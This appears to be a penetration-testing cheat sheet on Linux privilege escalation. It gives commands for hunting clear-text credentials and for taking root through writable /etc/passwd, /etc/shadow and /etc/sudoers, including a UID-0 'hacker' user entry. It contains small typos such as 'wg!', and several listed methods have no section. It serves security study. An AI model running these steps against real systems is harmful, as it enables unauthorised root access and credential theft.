# Linux-Privilege-Escalation-Basics
Simple and accurate guide for linux privilege escalation tactics 

# Privilege Escalation Methods

- Basic System Enumeration
- Bash History
- OpenVPN Credentials
- Writable Password Files - /etc/passwd | /etc/shadow | /etc/sudoers
- SSH Private Keys 
- Kernel Expliots
- Sudo -l 
- Sudo CVE 
- Sudo LD_PRELOAD
- SUID Binaries
- Capabilities
- Cron Jobs
- NFS Root Squashing


# Basic System Enumeration
Structure : Linux Command # <Comment / Tip>
```
uname -a # What OS kernel are we using?
hostname # What is my hostname?
lscpu # What is our CPU architecture?
ls /home # Any Users? Can we access their home directories?
ls /var/www/html # Any web config files? Do they contain DB or user credentials?
ps aux | grep root # What services are running as root? Any cron jobs running specific files as root? Can we write to those files? 
netstat -tulpn # What is running? Are they bound to local host but not from the public? Possible port forwarding
ifconfig # What is our IP? Are we dual-homed?
find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \; # Any files that contains clear-text credentials?
locate pass | more # Any files with the name pass?

```
# Bash History
Structure : Linux Command # <Comment / Tip>
```
history # Any clear-text credentials? Any command for logging into services with the credentials?
cat /home/<user>/.bash_history # Can we see CLI history of other users?

```

# OpenVPN Credentials
Structure : Linux Command # <Comment / Tip>
```
locate *.ovpn # Any OpenVPN files with clear-text credentials?

```

# Writable Password Files
Structure : Linux Command # <Comment / Tip>
```
ls -la /etc/passwd # Do we have write access to passwd?
If write access is enabled on /etc/passwd # Add new user with UID & GID of 0 (Root) OR Remove the root password

   echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd
   su - hacker
   id && whoami
   
OR
   
  vi /etc/passwd
  Remote X (Password Holder) for root
  wg!
  su root
  id && whoami
  
ls -la /etc/shadow # Do we have write access to shadow?
If write access is enabled on /etc/shadow # Generate new password hash and replace root's password

   Run python -c "import crypt; print crypt.crypt('NewRootPassword')"
   Copy the output
   vi /etc/shadow
   Replace root's hash with the output that you generated
   wq!
   su root # Provide the new root password you generated (Example: NewRootPassword)
   id && whoami
  
ls -la /etc/sudoers # Do we have write access to /etc/sudoers?
If write access is enabled on /etc/sudoers | Add new sudo entry

   echo "username ALL=(ALL:ALL) ALL" >> /etc/sudoers # Replace "Username" with your current user (Example: www-data)
   sudo su
   id && whoami

   ```
